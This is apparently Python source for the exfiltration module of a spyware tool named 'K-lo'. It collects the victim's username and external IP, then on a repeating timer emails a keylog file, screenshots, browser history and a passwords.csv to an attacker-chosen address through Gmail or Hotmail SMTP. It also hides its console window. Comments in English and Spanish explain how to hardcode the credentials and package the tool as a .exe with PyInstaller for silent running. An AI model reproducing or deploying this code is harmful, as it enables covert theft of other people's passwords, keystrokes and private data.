#HERE IS THE CODE THAT GENERATES THE EMAIL, YOU CAN CHANGE THE VALUE FROM MINUTOS, REMITENTE, PASSWORD AND DESTINATARIO
#FOR STATIC ONES AND THEN MAKE A .exe WITH Pyinstaller. THIS WAY YOU AVOID THE CONSOLE INTERFACE THAT ASKS FOR THE INPUT. 

#ESTE ES EL CODIGO QUE GENERA EL EMAIL, PUEDES CAMBIAR EL VALOR DE LAS VARIABLES MINUTOS, REMITENTE, PASSWORD Y DESTINATARIO 
#POR ALGUNOS ESTATICOS Y LUEGO CREAR UN .exe CON Pyinstaller. DE ESTA MANERA EVITAS LA PANTALLA DE CONSOLA QUE PIDE LA INFORMACION.

# librerias para email 
import smtplib, os 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import time, threading
import win32console 
import win32gui 
import urllib.request
import shutil, getpass

minutos = int(input(" Ingresa los minutos en que se envie el correo "))
remitente = input(" Ingresa el correo del remitente (quien envía) ")
password = input(" Ingresa la contraseña ")
destinatario =input(" Ingresa el correo del destinatario ")
usuario=getpass.getuser()
IP_externa = urllib.request.urlopen('https://ident.me').read().decode('utf-8')

WAIT_SECONDS = minutos * 60 
def corretiempo():


	msg= MIMEMultipart()

	msg['From'] = remitente
	msg['To'] = destinatario

	msg['Subject'] = "Reporte de K-lo de usuario "+ str(usuario) 

	cuerpo="¡Hola! estos son los archivos recabados del usuario "+ str(usuario) +" con la IP externa "+ str(IP_externa) +". Saludos desde K-lo."
	msg.attach(MIMEText(cuerpo,'plain'))
	archivo = "K-lo.txt"
	archivo2 = "screenshots.png"
	archivo3 = "historialweb.csv"
	archivo4 = "passwords.csv"


	archivos = []
	archivos.append(archivo)
	archivos.append(archivo2)
	archivos.append(archivo3)
	archivos.append(archivo4)
	for file in archivos:
		p = MIMEBase('application','octa-stream')
		p.set_payload(open(file,"rb").read())
		encode1 = encoders.encode_base64(p)
		p.add_header('Content-Disposition', 'attachment; filename= "{0}"'.format(os.path.basename(file)))
		
		msg.attach(p)
	if "hotmail.com" in remitente:
		s = smtplib.SMTP('smtp.live.com', 587)
		s.ehlo()
		s.starttls()
		s.ehlo()
		s.login(remitente, password)
		text = msg.as_string()
		s.sendmail(remitente,destinatario,text)
		s.quit()

	if "gmail.com" in remitente:
		 
		
		s = smtplib.SMTP('smtp.gmail.com', 587)
		s.ehlo()
		s.starttls()
		s.ehlo()
		s.login(remitente, password)
		text = msg.as_string()
		s.sendmail(remitente,destinatario,text)
		s.quit()		


	threading.Timer(WAIT_SECONDS,corretiempo).start()

	win = win32console.GetConsoleWindow()
	win32gui.ShowWindow(win,0)
corretiempo()

